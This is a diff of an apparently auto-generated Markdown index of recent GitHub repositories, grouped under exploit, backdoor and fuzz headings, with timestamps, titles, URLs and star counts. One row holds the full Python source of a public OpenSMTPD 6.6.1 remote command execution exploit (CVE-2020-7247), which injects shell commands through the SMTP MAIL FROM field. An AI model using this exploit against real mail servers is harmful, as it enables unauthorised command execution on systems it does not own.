@@ -51,7 +51,6 @@
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
 | 20211016T23:56:33Z | Null | https://github.com/Pen-Test3rs/binary_exploits_tasks_public | 0 | 0| 
-| 20211016T23:44:07Z | Multiple hacks that breaks the game | https://github.com/glixzzy/blooket-hack | 63 | 91| 
 | 20211016T23:35:00Z | Vulnerabilities Predictor used under e-Commerce domains to prevent exploitation of consumer data | https://github.com/dwaragesh-sivakumar/Cybersecurity-Internship | 1 | 0| 
 | 20211016T23:16:08Z | this bash script is for remote linux and macos hosts hacked! | https://github.com/FabioDefilippo/linuxallenum | 17 | 0| 
 | 20211016T23:14:28Z | Manage building and deploying exploitation challenges with ease | https://github.com/C0deH4cker/PwnableHarness | 49 | 3| 
@@ -60,6 +59,7 @@
 | 20211016T22:13:18Z | EDB-ID: 47984 CVE: 2020-7247  EDB Verified:  Author: 1F98D Type: REMOTE  Exploit:    /    Platform: LINUX Date: 2020-01-30  Vulnerable App:   # Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution # Date: 2020-01-29 # Exploit Author: 1F98D # Original Author: Qualys Security Advisory # Vendor Homepage: https://www.opensmtpd.org/ # Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1 # Version: OpenSMTPD < 6.6.2 # Tested on: Debian 9.11 (x64) # CVE: CVE-2020-7247 # References: # https://www.openwall.com/lists/oss-security/2020/01/28/3 # # OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately # escape dangerous characters from user-controlled input. An attacker # can exploit this to execute arbitrary shell commands on the target. #  #!/usr/local/bin/python3  from socket import * import sys  if len(sys.argv) != 4:     print(%Usage {} <target ip> <target port> <command>%.format(sys.argv[0]))     print(%E.g. {} 127.0.0.1 25 %touch /tmp/x%%.format(sys.argv[0]))     sys.exit(1)  ADDR = sys.argv[1] PORT = int(sys.argv[2]) CMD = sys.argv[3]  s = socket(AF_INET, SOCK_STREAM) s.connect((ADDR, PORT))  res = s.recv(1024) if %OpenSMTPD% not in str(res):     print(%[!] No OpenSMTPD detected%)     print(%[!] Received {}%.format(str(res)))     print(%[!] Exiting...%)     sys.exit(1)  print(%[*] OpenSMTPD detected%) s.send(b%HELO x\r\n%) res = s.recv(1024) if %250% not in str(res):     print(%[!] Error connecting, expected 250%)     print(%[!] Received: {}%.format(str(res)))     print(%[!] Exiting...%)     sys.exit(1)  print(%[*] Connected, sending payload%) s.send(bytes(%MAIL FROM:<;{};>\r\n%.format(CMD), %utf-8%)) res = s.recv(1024) if %250% not in str(res):     print(%[!] Error sending payload, expected 250%)     print(%[!] Received: {}%.format(str(res)))     print(%[!] Exiting...%)     sys.exit(1)  print(%[*] Payload sent%) s.send(b%RCPT TO:<root>\r\n%) s.recv(1024) s.send(b%DATA\r\n%) s.recv(1024) s.send(b%\r\nxxx\r\n.\r\n%) s.recv(1024) s.send(b%QUIT\r\n%) s.recv(1024) print(%[*] Done%)              | https://github.com/Sergio928/OpenSMTPD-6.6.1---Remote-Code-Execution---Linux-remote-Exploit | 1 | 0| 
 | 20211016T22:08:49Z | EDB-ID: 47984 CVE: 2020-7247  EDB Verified:  Author: 1F98D Type: REMOTE  Exploit:    /    Platform: LINUX Date: 2020-01-30 | https://github.com/Sergio928/OpenSMTPD-6.6.1---Remote-Code-Execution | 0 | 0| 
 | 20211016T21:53:27Z | Null | https://github.com/Anatik572/trust_bw_exploit | 1 | 0| 
+| 20211016T21:23:32Z | Database Systems - Principles of database design and operation. Relational data model. High-level data modeling representations. SQL database language. Active databases with constraints and triggers. Query optimization with views and indexes. Exploiting database servers within programming languages for web application development. Other topics include transaction processing and recovery, user-defined functions, and data warehousing.  | https://github.com/kingkirpal2000/CSE-111 | 1 | 0| 
 
 
 # backdoor on Github 推荐
@@ -89,16 +89,16 @@
 # fuzz on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
-| 20211016T12:56:09Z | The Content Fuzzyfyr module for Magento2 fills up empty content fields - and if needed - switches real content with dummy content. This is for development purposes, e.g. save time to prepare test data and matching GDPR restrictions. | https://github.com/hivecommerce/magento2-content-fuzzyfyr | 0 | 1| 
-| 20211016T12:29:47Z | Project page for %The Fuzzing Book% | https://github.com/uds-se/fuzzingbook | 620 | 128| 
-| 20211016T12:15:18Z | OSS-Fuzz vulnerabilities for OSV. | https://github.com/google/oss-fuzz-vulns | 29 | 11| 
-| 20211016T11:30:55Z | Null | https://github.com/zyrouge/fuzzle | 0 | 1| 
-| 20211016T08:55:27Z | Fuzzy matching for `company-mode%. | https://github.com/jcs-elpa/company-fuzzy | 67 | 6| 
-| 20211016T08:34:53Z | Fuzzy matching algorithm based on Sublime Text%s string search | https://github.com/jcs-elpa/sublime-fuzzy | 0 | 1| 
-| 20211016T07:13:18Z | This code is used to get coordinates (i.e., latitude and longitude) of some places using their fuzzy names from Google Maps. | https://github.com/lyx66/Get-Coordinates-Using-the-Fuzzy-Names-of-Places | 1 | 0| 
-| 20211016T06:36:29Z | Null | https://github.com/VeriBlock/fuzz-corpus | 1 | 1| 
-| 20211016T06:12:45Z | Whitepaper on %Fuzzing in the face of Threat Hunting% | https://github.com/maheshmohan1093m/Fuzzing_in_the_face_of_Threat_Hunting | 0 | 0| 
-| 20211016T05:00:02Z | Null | https://github.com/iiifr/vscode-fuzzyfind | 0 | 0| 
+| 20211016T23:40:45Z | Null | https://github.com/AmitShimon198/fuzzySearch | 0 | 0| 
+| 20211016T22:59:07Z | Gentoo overlay | https://github.com/lferra/fuzzy-potato | 1 | 0| 
+| 20211016T22:40:48Z | Emulation based snapshot fuzzer | https://github.com/jaoeul/gingersnap | 0 | 0| 
+| 20211016T22:31:00Z | The Official Fuzzy Britches Repository. | https://github.com/ThePapaw/fuzzybritches | 0 | 0| 
+| 20211016T21:45:22Z | Runtime Reduction Of a RBF Fuzzy Neural Network by reducing number of rules using a Linear programming  optimization approach | https://github.com/emad-arezoomand/rule-reduction-in-fuzzy-neural-network- | 0 | 0| 
+| 20211016T21:15:17Z | Monorepo for a collection of tools related to compiling Evals into WASM and then a fuzzer to compare different evals | https://github.com/coreyja/battlesnake-wasm-eval-tester | 0 | 0| 
+| 20211016T20:54:53Z | Fuzzer for the .NET toolchains, developed as a project for the 2018 Language-Based Security course at Aarhus University. | https://github.com/jakobbotsch/Fuzzlyn | 213 | 18| 
+| 20211016T19:20:18Z | Null | https://github.com/kalindasuer/fuzzy-spork | 0 | 0| 
+| 20211016T18:53:33Z | https://github.com/wcventure/FuzzingPaper | https://github.com/mishmashclone/wcventure-FuzzingPaper | 6 | 1| 
+| 20211016T18:09:08Z | A repository for top fuzzing works in the literature. | https://github.com/PBearson/Fuzzing_Works | 0 | 0| 
 
 
 
